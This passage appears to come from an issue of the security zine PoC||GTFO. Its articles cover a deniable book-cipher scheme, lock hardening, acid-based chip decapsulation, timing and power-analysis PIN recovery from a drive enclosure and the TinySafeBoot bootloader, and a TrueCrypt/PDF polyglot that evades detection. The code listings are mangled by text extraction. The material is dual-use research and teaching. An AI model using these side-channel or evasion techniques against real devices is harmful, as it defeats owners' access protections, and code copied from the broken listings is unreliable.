def d e c r y p t ( c i p h e r t e x t , s e c r e t _ k e y _ f i l e ) :
with open ( s e c r e t _ k e y _ f i l e ) as s :
f o r i n d e x in map( int , c i p h e r t e x t . s p l i t ( ) ) :
s . seek ( index )
sys . stdout . write ( s . read ( 1 ) )
In effect, what is happening is that Alice opens her book (the secret key), finds indexes of characters that
match the characters she has in her plaintext, writes those indexes down as her ciphertext, and sends it to
Bob. When Bob receives the ciphertext, he opens up his identical copy of the book, and for each index he
simply looks up the letter in the book and writes that down the letter into the decrypted plaintext. There
are various optimizations that can be made, vi&., using variable-length codes within the key similar to LZ77
compression (e.g., using words from the book instead of individual characters).
7.3
Lenticular Book Ciphers
In the previous section, I showed how a book cipher can be used to encrypt plaintext p 1 to ciphertext c using
secret key k 1 . In order for this to be useful as a plausibly deniable cryptosystem, we will need to ensure
that given some other secret key k 2 , the same ciphertext c will decrypt to a totally different plaintext p 2 .
In this section I’ll discuss an extension to the book cipher which achieves just that. I call it a “Lenticular
Book Cipher,” inspired by the optical device that can present different images to the viewer depending on
the lens that is used. I was unable to find any description of this type of cryptosystem in the literature,
likely because it is very naïve and practically useless . . . except for in the context of our specific motivating
scenarios!
Given a set of plaintexts P = {p 1 , p 2 , . . . , p n } and a set of keys K = {k 1 , k 2 , . . . , k n }, we want to find
a ciphertext c such that decrypt(c,k i ) 7→ p i for all i from 1 to n. To accomplish this, let’s consider an
individual byte within each of the plaintexts in P . Let p i [j] represent the j th byte of plaintext i. Similarly,
let’s define k i [j] and c[j] to refer to the j th byte of a key or the ciphertext. In order to encrypt the first byte
24of all of the plaintexts, we need to find an index m such that k i [m] = p i [0] for i from 1 to n. In general, c[`]
can be any unsigned integer m such that
∀i ∈ 1, . . . , n : k i [m] = p i [`].
We can relatively efficiently find such an m by modifying the way we build the indexes lookup table:
def b u i l d _ i n d e x ( s e c r e t _ k e y s ) :
i n d e x e s = {}
f o r i , key_bytes in enumerate ( zip ( ∗ s e c r e t _ k e y s ) ) :
key_bytes = tuple (map( ord , key_bytes ) )
i f key_bytes not in i n d e x e s :
i n d e x e s [ key_bytes ] = [ i ]
else :
i n d e x e s [ key_bytes ] . append ( i )
return i n d e x e s
Encryption then happens similarly to the regular book ciper:
def e n c r y p t ( p l a i n t e x t s , s e c r e t _ k e y s ) :
indexes = build_index ( secret_keys )
f o r t e x t _ b y t e s in zip ( ∗ p l a i n t e x t s ) :
t e x t _ b y t e s = tuple (map( ord , t e x t _ b y t e s ) )
print random . c h o i c e ( i n d e x e s [ t e x t _ b y t e s ] ) ,
Decryption is identical to the regular book cipher.
So, in fewer than twenty lines of Python, we have coded a PoC of a cryptosystem that allows us to do
the following:
e n c r y p t ( [ open ( " p l a i n t e x t 1 " ) . r e a d ( ) , open ( " p l a i n t e x t 2 " ) . r e a d ( ) ] ,
[ open ( " key1 " ) . r e a d ( ) , open ( " key2 " ) . r e a d ( ) ] )
If we pipe STDOUT to the file “cipher.enc”, we can decrypt it as follows:
with open ( " c i p h e r . enc " ) as enc :
d e c r y p t ( enc . r e a d ( ) , " key1 " ) # This w i l l p r i n t o u t p l a i n t e x t 1
d e c r y p t ( enc . r e a d ( ) , " key2 " ) # This w i l l p r i n t o u t p l a i n t e x t 2
There do seem to be a number of limitations to this cryptosystem, though. For example, what keys should
Alice use? The keys need to be long enough such that every possible combination of bytes that appears
across the plaintexts will occur in indexes; the length of the keys will need to increase exponentially with
respect to the number of plaintexts being encrypted. Fortunately, in practice, you’re not likely to ever need
to encrypt more than a few plaintexts into a single ciphertext. One possible source of publicly available keys
to use would be YouTube videos: Alice could simply download a video and use its raw byte stream as the
key. Then all she needs to do is communicate the name of or link to the video to Bill off-the-record.
I have created a complete and functional implementation of this cryptosystem, including some opti-
mizations (e.g., variable block length, compression, length checksums, error checking, &c.). It is available
here:
https://github.com/ESultanik/lenticrypt
7.4
Proving a Cat is Always Also a Dog
So far, I’ve gone through a lot of trouble to describe a cryptosystem of dubious information security 9
whose apparent functionality is already available from tools like TrueCrypt. In this section I will make a
9 While I do have a few letters after my name that suggest I know a thing or two about Computer Science, cryptography is
not my specific area of specialization.
25mathematical argument that provides what I believe to be a legal basis for the plausible deniability provided
by lenticular book ciphers, enabling its use in our motivating scenarios.
Laws and contracts aren’t interpreted like computer programs; legal decisions are often dictated less by
the defendant’s actions than by his or her intent. In other words, if it appears that Alice intended to send
Bob a copy of Video Falconry, she will be found guilty of piracy, regardless of how she conveyed the software.
But what if Alice legitimately only knew that key k 1 decrypted c to a picture of cats, and didn’t know
of its nefarious use to produce a copy of Video Falconry from k 2 ? How likely would it be for k 2 to produce
Video Falconry simply by coincidence?
For sake of this analysis, let’s assume that the keys are documents written in English. For example,
books from Project Gutenberg could be used as keys. I am also going to assume that each character in
a document is an independent random variable. This is a rather unrealistic assumption, but we shall see
that the asymptotic properties of the problem make the issue moot. (This assumption could be relaxed by
instead applying Lovász’s local lemma 10 .)
First, let’s tackle the problem of figuring out the probability that decrypt(c,k 2 ) 7→ p 2 completely by
chance. Let n be the length of the documents in characters and let m < n be the minimum required length
of a string for that text to be considered a copyright violation (i.e., outside of fair use). The probability that
decrypt(c,k 2 ) contains no substrings of length at least m from p 2 is
(n−m+1)
(1 − q m )
,
where q is the probability that a pair of characters is equal. Here we have to take into account letter frequency
in English. Using a table from Wikipedia 11 , I calculate q to be roughly 6.5 percent (it’s the sum of squares
of the values in the table). According to Google, there are about 130 million books that have ever been
written 12 . Let’s be conservative and say that two million of them are in English. Therefore, the probability
that at least one pair of those books will produce a copyrighted passage from c is

 2000000
(n−m+1) ( 2 )
,
1 − (1 − q m )
which is extremely close to 100% for all m < n  2000000.
Therefore, for any ciphertext c produced by a lenticular book cipher, it is almost certain that there exists
a pair of books one can choose that will cause a copyright violation! Even though we don’t know what those
books might be, they must exist!
Proving that this is a valid legal argument—one that would hold up in a court of law—is left as an
exercise to the reader.
10 Paul
Erdős and László Lovász. Problems and results on 3-chromatic hypergraphs and some related questions. Infinite and
finite sets (Colloq., Keszthely, 1973; dedicated to Paul Erdős on his 60th birthday), Volume II, North-Holland, Amsterdam,
1975, pp. 609–627. Colloq. Math. Soc. János Bolyai, Volume 10.
11 http://en.wikipedia.org/wiki/Letter_frequency#Relative_frequencies_of_letters_in_the_English_language
12 Leonid Taycher.
Books of the world, stand up and be counted!
All 129,864,880 of you.
August 5, 2010.
http://booksearch.blogspot.com/2010/08/books-of-world-stand-up-and-be-counted.html Retrieved March 21, 2014.
268
Hardening Pin Tumbler Locks against Myriad Attacks
for Less Than a Sawbuck
by Deviant Ollam, Merchant of Dead Locks
In 1983, the renowned locksmith and physical security icon Gerry Finch submitted a brief article to
Keynotes magazine, a publication of the Associated Locksmiths of America. In it, he described why it was
his belief that serrated pins within a lock were superior to spool pins, mushroom pins, or any other kind
of manipulation-resistant pins commonly-used in locks. Despite being very popular and well-received at
the time, such wisdom appears to have faded away somewhat among locksmithing circles. This article is a
re-telling of Finch’s original advice with updated diagrams and images, in the hopes that folk might realize
that some of the old ways are often still some of the best ways of doing things.
Pick-resistant pins are designed to interfere with the most common methods of attacking pin tumbler
locks. Conventional operation of a lock involves first pushing the pin stacks to their appropriate positions
and then turning the plug. Lockpicking, however, is performed by first applying turning pressure to the
plug, then—subsequent to that—the pushing of the pins stacks is performed, with pick tools instead of a
key. The following images document this process.
Pick-resistant pins make such an attack difficult by interfering with the easy movement of pin stacks if
a lock’s plug is already subject to turning pressure. While standard operation of the lock is still possible
(in the absence of any turning pressure, the blade of a user’s key will still push the pin stacks smoothly)
attempts to turn, then lift (which is how picking is performed) become much more complicated. If inclined,
one may acquire entire pinning kits consisting of such special pins from locksmiths supply companies. Seen
in the photo below is the tray of an “S-pin” security kit from LAB.
27The following images show how the ridges of a serrated pin make for additional friction during a typical
lock-picking attack.
While other styles of pick-resistant pins are available on the market (such as the spool style or mushroom
style seen in an earlier diagram) it was the serrated style which captured Gerry Finch’s attention and became
his favorite means of bolstering a lock’s ability to resist attack. Part of his reason pertained to the fact that
the ridges on a serrated pin are far less pronounced than on a spool or mushroom style pin. When performing
the picking process, a skilled attacker can often discern quite clearly the moment when they have encountered
a spool or mushroom driver pin. Due to the large ridge present and the very noticeable way in which a lock’s
plug will tend to turn (but the lock will fail to open) this information leakage will offer up valuable insight
to an attacker. Serrated pins give away far less detail to someone who is using lockpicks.
The very small ridges found on serrated pins also lend themselves to another, more substantial, means
of preventing attacks against pin tumbler locks, however. Although it was not common practice at the time,
Gerry Finch proposed something in the early 1980s which dazzled the locksmith community. Specifically, he
advocated the process of using a thin thread-tapping tool to create additional ridges inside of a lock’s plug,
within the chambers where the pins are installed.
28By cutting these threads into the pin chambers, a much greater degree of friction and positive lock-up
between the pins and the plug can be achieved. If there is turning pressure on the plug–as there is with a
lockpicking attack—and any attempt to push the pin stacks is made, the serrations will bite together. This
is remarkably robust for a number of reasons:
• Even if a dedicated lockpicker gets past one region of friction, serrated edges offer repeated additional
blockades to progress. Spool pins or mushroom pins typically offer only one point of resistance in each
pin stack.
• The positive lock-up between pins and the plug is achieved by the driver pins and also by the key pins
(if serrated key pins are installed) and for this reason this style of configuration should also offer some
resistance to impressioning attacks, as well.
The following images show the mechanism by which serrated pins and thread-tapped plug chambers work
in concert to resist picking attacks.
29It is those particular points indicated by the small arrows where the ridges and threading jam together
tightly. NOTE—As seen in the earlier photo of the field-stripped plug, I did not opt to run a tap through all
of the pin chambers. The front-most chamber was left plain and no serrated pins would be installed there.
This not only conceals the presence of such pins in the lock (at least from cursory inspection) but it affords
one the opportunity to install hardened anti-drill pins in that front chamber.
Gerry Finch suggested that course of action, as well. He also cautioned locksmiths against working a
tapping tool too deeply in each chamber. He recommends a maximum of three turns per chamber, no more.
Finch’s ideas proved so effective, and locks prepared in this manner tend to be so resistant to against
even dedicated attacks, that the LAB company started including a 6/32” tap in some of their S-pin kits. But
perhaps a little surprisingly, after all these years the practice has become so uncommon that few locksmiths
with whom I have spoken nowadays even know what the tap tool is for.
If you have the knowledge of even basic lock field-stripping, it is quite possible to upgrade a pin tumbler
lock using this technique for very little cost. The LAB company’s S-pins are available for less than a dime
each 13 and hardware tool suppliers sell both the 6/32” tap and a suitable tap handle for four dollars apiece.
Best of luck upgrading your security if you try this yourself. With a little care and dedication and for
less than one Hamilton you could make your locks a great deal more resistant to attacks by someone like me.
13 While this is technically true, such pins are commonly sold in packages of 100. So you’re often out six to seven dollars for
the bag, and a variety of sizes of key pins and driver pins are needed to do the job properly. It’s best to find a friendly locksmith
who might sell you a handful of individual pins for a few dollars.
30poCoRgtfO
Gerry Finch was a legend in the lockpicking and locksmithing community, developing
tools, techniques, instructional courses, and published works throughout his career.
A veteran of the US Air Force (ret 1964) he also worked with the US Army Tech-
nical Intelligence Center teaching their Defense Against Methods of Entry course.
Finch is the recipient of the Locksmith Ledger’s Hall of Fame Award, The California
Locksmith Association’s Golden Key Award, Associated Locksmiths of America’s
President’s Award, the Lee Rognon Award, the Gerald Connelly Pioneer Award, and
the Philadelphia Award. He retired officially in 1996, but I still wouldn’t want to go
head-to-head with him in a picking contest.
319
Introduction to Reflux Decapsulation and Chip Photography
by Travis Goodspeed
Howdy y’all,
Unlike my prior articles for PoCkGTFO, this one is an introductory tutorial.
If you are already stripping and photographing microchips, then there will be
little for you to learn here. If, however, you want to photograph a chip and
don’t know where to begin, this is the article for you.
I’m also required by my own conscience and by good taste to warn you that
if you attempt to follow these instructions, you will probably get a little bit
hurt. Please be very fucking careful to ensure that you only get a little bit hurt.
If you have any good sense at all, you will do this in a proper chemistry lab
with the assistance of professionals rather than rely on this hobbyist guide. If
you don’t know whether to add water to acid or acid to water, and why you
will hurt yourself a lot if you don’t know, please stop reading now and take a
community college course with a decent lab component.
9.1
Chemistry Equipment
At a bare minimum, you will need high-strength nitric acid (HNO 3 ) and sulfuric acid (H 2 SO 4 ). Laws for
acquiring these vary by country, and if you’re in a jurisdiction that cares too much about the environment,
you might need to use a different method. 14 In addition to the two acids, you will need isopropyl alcohol
and acetone as solvents for cleaning.
Beyond the chemicals, you will need a bit of glassware. Luckily, the procedure is simple enough, so some
test-tubes, beakers, and a ring stand with buret clamps will do. If you get second-hand clamps, be aware
that metal should not directly touch the glass of the test tube; your clamp might be missing a rubber or
cloth piece to prevent scratches.
The acids that you are working with can attack metals, so get several acid-resistant tweezers. I learned
a while ago that tweezers get lost or bent, so buy a dozen and you won’t have to worry about it again.
Because the acid fumes, particularly the nitric acid fumes, are so noxious, you will need a fume hood to
properly contain the acid gas that boils out of the test tube when you screw up the heat.
As a handy indicator of where the acid fumes are going, I save thermal paper cardstock from air and rail
tickets. They turn red or black in the presence of acid fumes, and by balancing one above the test tube I
get a visual warning that the fumes have spread too far.
You could get by with a toothbrush and solvent for cleaning the chip surface, but an ultrasonic bath with
solvent is better. Cheap ultrasonic cleaners are available for cleaning jewelry, and they work well enough,
but be careful not to let your cleaning solvents dissolve their exposed plastic.
Finally, you will need a source of regulated heat. At this point, you’re probably itching to strike off a
Bunsen burner, but those are really a terrible choice. Instead, I use a cheap SMD rework soldering station,
the Aoyue 850A. By turning the airflow near maximum and slowly raising the temperature, I can heat the
test tube to a consistent temperature.
9.2
Chemistry Procedure
Your sample should be the smallest package of the target chip you can purchase. For a specific example, the
Texas Instruments MSP430F2012 is available as PDIP (Plastic Dual Inline Package) and QFN (Quad Flat
No-leads) among other packagings. While this procedure works for either, the QFN package is much smaller
and has less plastic to be etched away, so it will consume far less of your nitric acid.
Begin by connecting the buret clamp to your ring stand as shown in Figure 6, with the SMD rework
station’s wand held just beneath the bottom of where the test-tube will be. Do not turn on the heat yet.
14 I’ve
heard that the Germans get good results with kolophonium, better known as rosin.
32Figure 6: The clamp stand holds the test-tube next to the SMD rework station.
Place the chip into the test-tube with enough nitric acid to cover the chip and optionally add just a
splash of sulfuric acid to make it attack the plastic instead of the bonding wires. For safety reasons, you will
very quickly learn to do this while the glass is cold, just as you will very quickly and rather painfully learn
that cold glass looks exactly like hot glass.
Place the test tube into the buret clamp. The tube should be slightly tilted, with
the bottom closer to you than the top so that any explosive eruptions of boiling acid
go away from your face.
With the chip covered in acid, turn the SMD rework station on with high speed
and low heat. Slowly raise the temperature while watching the well-lit column of the
test tube. The idea here is to create a poor man’s reflux, in which the acid boils but
the column of acid vapor above it remains beneath the lid of the test tube, unable
to spill out. Shining a laser pointer into the tube will reveal the exact height of the
column, as the laser is scattered by the acid but not by clean air.
Overheating the test tube will cause the acid to steam out, filling either the fume
hood or your lab with acid fumes. All of the iron in the room will rust, your lungs
will burn, and the fire alarm will trigger. Don’t do this.
As the chip boils in nitric acid, the packaging will crumble off in chunks. This
crumbling should continue until either the chip’s die is exposed or the acid is spent.
You might notice the acid solution changing color. HNO 3 turns green or blue
after dissolving copper, which greatly reduces its ability to break apart the plastic.
Once the acid is spent, let the test-tube cool and then spill its contents into a beaker.
At this point, the acid might not be strong enough to further break apart the packaging, but it’s still
strong enough to burn your skin. HNO 3 burns don’t hurt much at first, and light ones might go unnoticed
except for a yellowing of the skin that takes a week or so to peel off. Sometimes you’ll notice them first as
an itch, rather than a burn, so run like hell to the sink if a spot on your hand starts itching. H 2 SO 4 burns
more like you’d expect from Batman cartoons, with a sharp stinging pain. It results in a red rash instead of
33Figure 7: This is one photo of 1,475 that I took of the Clipper Chip.
yellowed skin. 15
So now that you know better than to stick your fingers into the beaker of acid, use tweezers to carefully
lift the die out of the acid and drop it into a second beaker of acetone. This beaker–the acetone beaker–goes
into the ultrasonic bath for a few minutes. At this point the die will be partially exposed with a bit of gunk
remaining, but sometimes larger chips will still be covered.
For best quality, the HNO 3 should be repeated until very little of the gunk is left, then a bath of only
H 2 SO 4 will clean off the last bits before photography.
These two acids are very different chemicals, and you will find that the H 2 SO 4 bath behaves nothing like
the HNO 3 baths you’ve previously given the chip. H 2 SO 4 has a much higher boiling point than HNO 3 , but
it’s also effective against the chip packaging well beneath its boiling point. You will also see that instead of
flaking off the packaging, H 2 SO 4 dissolves it, taking on an ink-black color through which you won’t be able
to see the sample.
After the final H 2 SO 4 bath, give the chip one last trip through the ultrasonic cleaner and then it will be
ready to photograph.
9.3
Photographic Equipment
Now that you’ve got an exposed die, it’s time to photograph it. For this you will need a metallurgical
microscope, meaning one that gives an image by reflected rather than transmitted light.
Microscope slides work for samples, but they aren’t really necessary, because no light comes up from the
bottom of a metallurgical microscope anyways. Small sample boxes with a sticky surface are handier, as
they are less likely to be damaged in a fall than a case full of glass microscope slides.
For photographing your chip, you can either get a microscope camera or an adapter for a DSLR. Each
of these has its advantages, but the microscope cameras are very often just cheap webcams with awkward
Windows-only software, so I go the DSLR route. Through either sort of camera, you can take individual
photos like the one in Figure 7.
15 Here’s
a handy rhyme to remember safety:
Johnny was a Chemist’s Son,
but Johnny is No More.
What Johnny thought was H 2 O,
was H 2 SO 4 !
349.4
Photographic Procedure
Whichever sort of camera you use, you won’t be able to fit the entire chip into your field of view. In order
to get an image of the whole chip, you must first photograph it piecemeal, then stitch those photos together
with panorama software. 16
Begin at a known corner of the chip and take a series of photographs while moving in the same direction
and keeping the top layer of your sample in focus. Each photograph should overlap by roughly a third
its contents with the image before and after it, as well as those on adjacent rows. Once a row has been
completed, move on to the next row and move back in the opposite direction.
Once you have a complete set of photos, load them in Hugin on a machine with plenty of RAM. Hugin
is a GUI frontend to panorama utilities, and it allows you to correct mistakes made by those tools if there
aren’t too many of them.
Hugin will do its best to align the pictures for you, and its result is either a near-perfect rendering or
a misshapen mess. If the mess is from a minor mistake, you can correct it, but for serious errors such as
insufficient overlap or bad focus, you will need to do a new photography session. With plenty of overlap, it
sometimes is enough to simple delete the offending photographs and let the others fill in that part of the
image.
Figure 8 shows the complete, but reduced resolution, die photograph that I took of the Clipper Chip.
This was built from 1,475 surface photographs that were stitched together by Hugin.
9.5
Further Reading
While you should get a proper chemistry education for its own sake, textbooks on chemistry as written for
chemists don’t cover these sorts of procedures. Instead, you should pick up books on Failure Analysis, which
can double as coffee table books for their nifty photographs of disassembled electronics.
After mastering surface photography, there are all sorts of avenues for continuing your new hobby. Using
polishing equipment or hydrofluoric acid, you can remove the layers of the chip in order to photograph its
internals. The neighbors at the Visual6502 project took this so far as to work backward from photographs
to a working gate-level simulation in Javascript!
Additionally, you can decap a chip while it’s still functional to provide for invasive or semi-invasive attacks.
For invasive attacks, take a look at Chris Tarnovsky’s lectures, as he’s an absolute master at sticking probe
needles into a die in order to extract firmware. Dr. Sergei Skorobogatov’s Ph.D. thesis describes a dozen
tricks for semi-invasively shining lasers into chips in order to extract their secrets, while Dmitry Nedospasov’s
upcoming thesis is also expected to be nifty.
poCoRgtfO
Neighborly thanks are due to Andrew Righter and everyone who was polite enough not to yell at me for
the die photos that I posted with improper exposure or incomplete decapsulation.
Cheers from Samland,
—Travis
16 For fancy things like recovering gates in delayered chips, more sophisticated software is needed, but panorama software
suffices when only the top layer is being photographed.
35Figure 8: This is the complete die photograph of the Clipper Chip at reduced resolution.
3610
Forget Not the Humble Timing Attack
by Colin O’Flynn
Judge not your neighbour’s creation, as you know not under what circumstances they were created. And
as we exploit the creations of those less fortunate than us, those that were forced to work under conditions
of shipping deadlines or unreasonable managers, we give thanks to their humble offering of naïve security
implementations.
For when these poor lost souls aim to protect a device using a password or PIN, they may choose to
perform a simple comparison such as the following.
int password_loop ( v o i d ) {
u n s i g n e d c h a r master_password [ 6 ] ;
u n s i g n e d c h a r user_password [ 6 ] ;
read_master_password_from_storage ( master_password ) ;
wait_for_pin_entry ( user_password ) ;
f o r ( int i = 0 ; i < 6 ; i ++){
i f ( master_password [ i ] != user_password [ i ] ) {
return 0 ;
}
}
return 1 ;
}
Which everyone knows are subject to timing attacks. Such attacks can be thwarted of course by comparing
a hash of the password instead of the actual password, but simple devices or small codes such as bootloaders
may skip such an operation to save space.
10.1
A PIN-Protected Hard Drive
Let’s look at a PIN-protected hard drive enclosure, which the vendor describes as a “portable security
enclosure with 6 digit password.” This enclosure formats the hard drive into two partitions, the Public
partition and the secured Vault partition. The security of the Vault is entirely given by sacrilegious changes
to the partition table, such that if you remove the hard disk from the enclosure and plug into a computer
the OS won’t recognize the disk, thinking it tainted. The data itself is still there however.
The PCB contains four ICs of particular interest: a Marvell 88SA8040 Parallel ATA to Serial ATA
bridge, a JMicron JM20335 USB to PATA bridge, a WareMax WM3028A (no public information), and a
SST 39VF010 flash chip connected to the WM3028A. There’s also a number of discrete logic gates including
two 74HCT08D AND devices and one 74HC00D NAND device. These logic gates are used to multiplex
multiple parts from apparently limited IO pins of the WM3028A. It would appear that the system passes
the Parallel ATA data through the WM3028A chip, which is presumably some microcontroller-based system
responsible for fixing reads of the partition table once the correct password is put in.
The use of discrete logic chips for multiplexing IO lines ultimately makes our life easier. In particular
one of the 74HCT08D chips, U10, provides us with a measurement point for determining when the password
has failed the internal test.
Pin 3 of the switch is the multiplexing pattern from the microcontroller. Remember we must determine
when the microcontroller has read the pin, not simply when the user pushed the pin. Knowing that this
button was pressed, and thus caused the ‘Wrong PIN’ LED to come on, we can measure the time between
when the microcontroller has read in the entire PIN and when the LED goes on.
We then break the system one digit at a time by measuring the time after the last button is pressed.
First we enter 0-6-6-6-6-6, then 1-6-6-6-6-6, 2-6-6-6-6-6, etc. The delay between reading the button press and
37Figure 9: Pin-Protected Hard Disk
displaying the LED will be shortest if the first digit is wrong, longer if the first digit is right. A moving-picture
version of this is available on the intertubes. 17
An example of the oscilloscope capture of this is shown in Figure 10, where the correct password is 1-2-
3-4-5-6. Note the jump in time delay between 0-6-6-6-6-6 and 1-6-6-6-6-6. This continues for each correct
digit. Thus for a 6-digit pin, we guess only a worst case of 10 ∗ 6 = 60 options, instead of the million that
would be required for brute-forcing the full pin.
10.2
TinySafeBoot for the Atmega328P
But what if the clever developer decided to not tell the user when they’ve entered a wrong password? A
security-conscious bootloader might wish to avoid being vulnerable to timing attacks, but is attempting to
avoid adding hash code for size reasons. An example of this is pulled from a real bootloader which has
a password feature. When a wrong password is entered jumps into an endless loop, effectively avoiding
providing information that would be useful for a timing attack.
In particular, let’s take a look at TinySafeBoot, which is a very small bootloader for most AVR micro-
controllers. 18 This wonderful bootloader has many features, such as using a single IO pin, auto-calibrating
baud rate, and automatically build a bootloader image for you. And, as already mentioned, it contains a
password feature.
But compare the measurements of the power signatures shown in Figure 11, which is the bootloader
running on an AtMega328P. The correct password is {0x61, 0x52, 0x77, 0x6A, 0x73}. If we measure
the power consumption of the device, we observe clear differences between the correct and incorrect guesses.
This can be done by using a resistor in-line with the microcontroller power supply, such as by lifting a TFQP
package pin.
The code for the password feature looks as in the following listing. Note when you receive an incorrect
17 http://tinyurl.com/pintiming
18 You
can find more information about this bootloader at http://jtxp.org/tech/tinysafeboot_en.htm.
38Figure 10: Timing Results
39Figure 11: Power Analysis. Above is a correct guess, Below is incorrect.
character the system jumps into an infinite loop at the chpwl label, meaning a reset is required to try another
password.
CheckPW :
chpw1 :
lpm tmp3 , z+
c p i tmp3 , 255
breq chpwx
r c a l l Receivebyte ;
;
;
; l o a d c h a r a c t e r from F l a s h
byte value (255) i n d i c a t e s
end o f password −> e x i t
e l s e receive next character
cp tmp3 , tmp1
breq chpw1
c p i tmp1 , 0
brne chpwl
r c a l l RequestConfirmation
b r t s chpa
r c a l l RequestConfirmation
b r t s chpa
r c a l l EmergencyErase
rjmp Mainloop ;
;
;
;
;
;
;
;
; compare w i t h password
i f equal check next character
or was i t 0 ( emergency e r a s e )
i f not , l o o p i n f i n i t e l y
i f yes , r e q u e s t c o n f i r m
not confirmed , l e a v e
r e q u e s t 2nd c o n f i r m
cannot be m i s t a k e now
go , emergency e r a s e !
rjmp APPJUMP ; start application
rjmp S e n d D e v i c e I n f o ; go on t o S e n d D e v i c e I n f o
chpw2 :
chpwl :
chpa :
chpwx :
;
We can immediately see the jump to the infinite loop in the power trace! It happens as soon as the device
receives an incorrect character of the password. Thus despite the original timing attack failing, with a tiny
bit of effort we again find ourselves easily guessing the password.
40Figure 12: Tapping VCC for Power Analysis
Measuring the power consumption of the microcontroller requires you to insert a resistor into the power
supply rail. Basically, this requires you to perform the schematic as shown in Figure 12. Note you can insert
it either into the VCC or the GND rail. It may be that the GND rail is cleaner for example, or it may be
that it’s easier to physically get at the VCC pin on your device.
For a regular oscilloscope you may need to build a Low Noise Amplifier (LNA) or Differential Probe. I’ve
got some details of that in my previous talk and whitepaper. 19 You can expect to make a probe for a pretty
low cost, so it’s a worthwhile investment!
In terms of physically pulling this off, the easiest option is if you build a breadboard circuit with the AVR
and a resistor inserted in the power line. Be sure you have lots of decoupling after the resistor, which will
give you a much cleaner signal. If you’re looking to use an existing board, you can make a ‘cheater’ socket
with a resistor inline, as in Fig B, which was designed for an Arudino board.
Real devices are likely to be SMD. If you’re attacking a TQFP package, you might find it easiest to lift a
lead and insert a 0603 or 0402 resistor inline with the power pin. You might wish to find a friendly neighbour
with a steady hand and a stereo microscope for this if you aren’t of strong faith in your soldering!
poCoRgtfO
Thus when attacking embedded systems, the timing attacks often present a practical entry method.
Be sure to carefully inspect the system to determine the ‘correct’ measurement you need to use, such as
measuring the point in time when the microcontroller reads an I/O pin, not simply when an external event
happens.
When designing embedded systems, store the hash of the users password, lest ye be embarrassed by
breaks in your device.
19 http://newae.com/blackhat
4111
This Encrypted Volume is also a PDF; or,
A Polyglot Trick for Bypassing TrueCrypt Volume Detection
by Ange Albertini
In this article I will show you a nifty way to make a PDF that is also a valid TrueCrypt encrypted volume.
This Truecryption trick draws on Angecryption from PoCkGTFO 03:11, so if you missed it you can go back
in PoC-time now or later, and enjoy even more common file format schizophrenia!
11.1
What is TrueCrypt?
If you open a TrueCrypt container in a hex editor, you’ll see that, unlike many binary formats, it looks like
entirely random bytes. It does in fact have a header that starts with the magic signature string TRUE at file
offset 0x40, but this header is stored encrypted, and thus you can’t spot it offhand. To decrypt the header,
one needs both the correct password and the hopefully random salt that is stored in the bytes 0-63, just
before the encrypted header.
So, a TrueCrypt file starts with 64 bytes of randomness, used as salt to derive the header key from the
password. This key is used to decrypt the header. If the result of the decryption starts with TRUE, then it
means the password was correct, and the now decrypted header is parsed further. In particular, this header
contains volume keys, which are, in turn, used to encrypt/decrypt the blocks and sectors of the encrypted
drive.
Importantly, the salt itself is only used to decrypt the header. This is to defend against rainbow table-like
precomputing attacks.
Let’s start with an existing TrueCrypt volume file for which we know the password. We are not going to
change its actual contents or the header’s plaintext, but we are going to re-encrypt the header so that the
whole becomes a valid PDF file while remaining a valid TrueCrypt volume as well.
42Because the salt is supposed to be random, it can be anything we choose. In particular, it can double
as any other file format’s header. Using the original salt and password, we can decrypt the header. By
choosing a new salt—which starts with the header of our new binary target—we derive new keys, and can
thus re-encrypt the header to match our new salt.
So, our new file contains the new salt, the re-encrypted header, and the original data sectors of the
TrueCrypt container. But where will the new PDF binary content go?
For merging in the new content, we are going to use the trick that the readers of Angecryption, PoCkGTFO
03:11, must have guessed already. As we showed there, in many binary formats such as PDF, PNG, etc., it
is possible to reserve a big chunk of space filled with dummy data right after the format’s header, and have
the binary format’s interpreters simply skip over that chunk. This is exactly what we are going to do: all of
the TrueCrypt volume data would go into the dummy chunk, followed by the new binary content.
If we want a valid binary file to be a TrueCrypt polyglot, we must fit its header and the declaration for
the dummy chunk within 64 bytes, the size of the salt. For Angecryption, we managed with only 16 bytes
to play with, so having 64 bytes almost feels like sinful and exuberant waste.
11.2
An elegant PDF integration
So far, our PDF/TrueCrypt polyglot looks like no contest. To add a bit of challenge, let’s make it with
standard PDF-making tools alone. We’ll ask pdflatex(1) nicely to include the TrueCrypt volume into our
polyglot.
Specifically, we’ll create a dummy stream object directly inside the document, using the following
pdflatex commands:
\begingroup
\pdfcompresslevel=0\relax
\immediate\pdfobj stream
file {pocorgtfo/truecryption/volume}
\endgroup
The bytes between the start of the resulting PDF file and our object that contains the TrueCrypt container
will depend on the PDF version and its corresponding structure. Luckily, the size of this PDF head-matter
data is typically around 0x20, well below 0x40. Plenty of legroom on this polyglot flight!
So our PDF will start with its usual header, followed by this standard stream object we created to play
the role of a dummy buffer for the TrueCrypt data. We now need to readjust the contents of this buffer so
that the encrypted TrueCrypt header matches its salt, which contains the PDF header, and we then get a
standard PDF that is also a TrueCrypt container.
11.3
Conclusion
This technique can naturally be applied to any other file format where we can fit the header and a dummy
space allocation within its first 64 bytes, the size of TrueCrypt’s initial salt.
Moreover, inserting your encrypted volume into a valid file—while keeping it usable—also has the benefit
of putting it under the radar of typical TrueCrypt detection heuristics. These heuristics rely on encrypted
TrueCrypt volumes having a round file size, uniformly high entropy, and no known header present. Our
method breaks all of these heuristics, and, on top of that, leaves the original document perfectly valid and
plausibly deniable. 20
20 Of course, this advice is legally worth exactly what you paid for it, and likely less. No warranty intended or implied, void
where prohibited by law, etc., etc., etc. Not endorsed by any lawyers real, imaginary, or played-on-TV, but may be considered
“digital cyber-bullets” by some. You may be called a merchant of digital cyber-polyglot death, too—you have been warned!
–PML
4312
How to Manually Attach a File to a PDF
by Ange Albertini
If you followed the PoCkGTFO’s March of the Polyglots to date, you may have noticed that until now
the feelies were added in a dummy object at the end of the PDF document. That method kept unzip(1)
happy, and Adobe PDF tools were none the wiser.
Yet Adobe in its wisdom created its own way of attaching files to a PDF!
One of the great features of PDF is its ability to carry attached files, just as e-mail messages can
carry attached files. Any kind of file, and any number of files, can be sucked into a PDF file. These
are held internal to PDF as “stream” objects, one of the basic 8 object types from which all PDF
content is built (numbers, arrays, strings, true, false, names, dictionaries and streams). Streams
start with a dictionary object but then carry along an arbitrarily long sequence of arbitrary 8-bit
bytes. Stream objects meet the generic description for disk files quite well.
—Jim King at Adobe
So, dear reader, prepare to be sucked in into PDF feature(creep) greatness! 21
